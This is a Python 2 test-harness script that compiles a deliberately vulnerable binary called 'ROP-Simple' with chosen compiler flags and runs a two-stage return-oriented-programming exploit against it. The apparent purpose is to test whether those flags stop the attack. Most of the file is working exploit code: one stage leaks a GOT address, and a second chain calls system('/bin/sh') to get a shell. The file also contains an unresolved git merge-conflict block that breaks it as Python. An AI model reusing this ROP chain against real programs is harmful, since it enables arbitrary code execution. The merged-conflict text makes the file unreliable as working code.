from subprocess import *
import struct
import os.path
import os

PQ = lambda x:struct.pack('Q', x)
UPQ = lambda x:struct.unpack('Q', x)[0]
pop_gadget = 0x000000000040066a
call_gadget = 0x0000000000400650
pop_rdi = 0x400673
write_got = 0x601018
main = 0x4005bd

p = None
stdin = None
stdout = None

# TODO : Change way to find Segmentation fault
def is_error():
    with open('/tmp/err', 'rb') as f:
        data = f.read().strip()
        print "DATA : %s" % repr(data)
        if (data == 'Illegal instruction' or data == 'Segmentation fault'):
            return 2
        else:
            return 0

def leak(got, arg1, arg2, arg3):
    return ''.join(map(PQ, [pop_gadget, 0, 1, got, arg3, arg2, arg1, call_gadget])) \
        + "A" * 7 * 8

def read_banner():
    print stdout.read(len("Give me your input!\n"))

def exploit():
    try:
        read_banner()
        payload = "\x00"*0x118
        payload += leak(write_got, 1, write_got, 8)
        payload += PQ(main)
        payload = payload.ljust(0x200, "\x00")
        stdin.write(payload)
        bin_base = UPQ(stdout.read(8)) - 0x00000000000eb860
        print "BINARY BASE : %08X" % bin_base
        system = bin_base + 0x0000000000046640
        bin_sh = bin_base + 0x17ccdb
        execve = bin_base + 0x00000000000c1330
        read_banner()

        payload2 = "\x00"*0x118 + PQ(pop_rdi) + PQ(bin_sh) + PQ(system)
        payload2 = payload2.ljust(0x200, "\x00")
        stdin.write(payload2)
        stdin.write("id > /tmp/result\n")
        print stdout.readline()
        if os.path.isfile('/tmp/result') and os.path.getsize('/tmp/result') > 0:
            return 2
        else:
            return 0
    except:
        return is_error()
#
# Define the code which runs inside the test containers.
#
# Use the run() function to list which hooks should run in which containers
# and in what order. Simply call H.run() as many times as needed.
#
# Hooks can be any function in this file.
#

def run(H):
<<<<<<< HEAD
    H.run('target','run_exploit')
=======
	H.run('target','run_exploit')
>>>>>>> 9373c78ce26629042af72f0a3c8fcb5f915ce794

def run_exploit():
    try:
        cflag = os.environ['cflags']
    except:
        cflag = ''
	
    # TODO : compiling in test code is ugly
    os.system('make CC=clang CFLAGS="%s"' % cflag)
    


    global p, stdin, stdout
    p = Popen("./ROP-Simple 2>/tmp/err", shell=True, stdin=PIPE, stdout=PIPE)
    stdin = p.stdin
    stdout = p.stdout
    return exploit()
